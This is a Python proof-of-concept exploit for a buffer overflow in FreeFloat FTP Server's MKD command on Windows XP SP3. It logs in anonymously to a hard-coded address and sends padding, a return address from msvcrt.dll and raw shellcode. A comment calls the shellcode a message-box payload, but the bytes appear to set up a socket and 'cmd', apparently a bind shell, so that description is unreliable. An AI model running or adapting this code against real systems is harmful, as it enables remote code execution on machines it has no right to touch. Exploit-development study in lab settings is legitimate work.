#!/usr/bin/python

#----------------------------------------------------------------------------------#
# Exploit: FreeFloat FTP (MKD BOF)                                                 #
# OS: WinXP PRO SP3                                                                #
# Author: b33f (Ruben Boonen)                                                      #
# Software: http://www.freefloat.com/software/freefloatftpserver.zip               #
#----------------------------------------------------------------------------------#

import socket
import sys

#-----------------------------------------------------------------------------------------------------------------------#
# sudo msfvenom -a x86 --platform Windows -p windows/messagebox TEXT='Pop the box!' TITLE=b33f -b '\x00\x0A\x0D' -f c   #
# Payload size: 289 bytes                                                                                               #
#-----------------------------------------------------------------------------------------------------------------------#
shellcode = (
"\x31\xdb\x53\x53\x53\xb3\x06\x53\x31\xdb\x43\x53\x43\x53\xbb\x6a\x8b\xab\x71\xff\xd3\x96"
"\xbb\x15\xfe\xb9\xca\x81\xeb\x55\x55\x55\x55\x53\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe3\x6a\x16\x53\x56\xbb\x07\x4a\xab\x71\xff\xd3"
"\xbb\x41\x63\x6d\x64\xc1\xeb\x08\x53\x89\xe1\x31\xd2\x56\x56\x56\x52\x52\x31\xc0\x66\xb8\x01\x01\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x80\xc2\x2c\x52\x89\xe0\x31\xd2\x52\x52\x52\x52\x54\x50\x31\xdb\x53\x53\x53\x43\x53\x4b\x53\x53\x51\x53\xbb\x6b\x23\x80\x7c\xff\xd3"
)

#----------------------------------------------------------------------------------#
# Badchars: \x00\x0A\x0D                                                           #
# 0x77c35459 : push esp #  ret  | msvcrt.dll                                       #
# shellcode at ESP => space 749-bytes                                              #
#----------------------------------------------------------------------------------#

buffer = "\x90"*15 + shellcode
evil = "A"*247 + "\x59\x54\xC3\x77" + buffer + "C"*(749-len(buffer))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.100.122',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close


